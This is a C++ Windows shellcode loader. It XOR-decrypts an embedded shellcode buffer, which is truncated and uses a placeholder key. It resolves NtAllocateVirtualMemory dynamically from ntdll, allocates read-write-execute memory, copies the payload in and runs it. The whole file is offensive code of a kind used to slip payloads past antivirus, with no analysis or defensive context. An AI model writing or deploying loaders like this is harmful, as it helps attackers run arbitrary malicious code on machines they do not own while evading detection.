#include <iostream>
#include <winternl.h>
#include <Windows.h>
#include <iomanip>
#include <ntstatus.h>

using namespace std;

void printHexValues(const unsigned char buf[], size_t size) {
    for (size_t i = 0; i < size; i++) {
        cout << hex << setw(2) << setfill('0') << (int)buf[i] << " ";
    }
    cout << endl;
}

typedef NTSTATUS(WINAPI* MyNtAllocateVirtualMemory)(
    HANDLE    ProcessHandle,
    PVOID* BaseAddress,
    ULONG_PTR ZeroBits,
    PSIZE_T   RegionSize,
    ULONG     AllocationType,
    ULONG     Protect
    );

typedef NTSTATUS(WINAPI* MyNtFreeVirtualMemory) (
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    PSIZE_T RegionSize,
    ULONG FreeType
    );

void xorDecrypt(unsigned char* data, int length, const std::string& key) {
    int keyLength = key.length();
    for (int i = 0; i < length; i++) {
        data[i] = data[i] ^ key[i % keyLength];
    }
}

int main() {
    cout << "PID: " << GetCurrentProcessId() << endl;
    system("pause");

    // shellcode
    unsigned char buf[] =
        "\x98\x7b\xe0\x96\xc1\x98\xb4\x69\x30\x6e\x2a\x62\x38\x34"
        "..."

    size_t bufSize = sizeof(buf);

    // decryption
    xorDecrypt(buf, bufSize, "<decryptionKey>");

    MyNtAllocateVirtualMemory NtAllocateVirtualMemory = (MyNtAllocateVirtualMemory)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtAllocateVirtualMemory");

    MyNtFreeVirtualMemory NtFreeVirtualMemory = (MyNtFreeVirtualMemory)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtFreeVirtualMemory");

    if (!NtAllocateVirtualMemory || !NtFreeVirtualMemory) {
        cout << "Failed to get function pointers" << endl;
        return 1;
    }

    void* exec = NULL;
    SIZE_T size = bufSize;
    NTSTATUS status = NtAllocateVirtualMemory(GetCurrentProcess(), &exec, 0, &size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    if (status != STATUS_SUCCESS) {
        cout << "Memory allocation failed" << endl;
        return 1;
    }

    RtlCopyMemory(exec, buf, bufSize);
    
    ((void(*)())exec)();

    size = 0;
    status = NtFreeVirtualMemory(GetCurrentProcess(), &exec, &size, MEM_RELEASE);

    if (status != STATUS_SUCCESS) {
        cout << "Memory deallocation failed" << endl;
        return 1;
    }

    return 0;
}
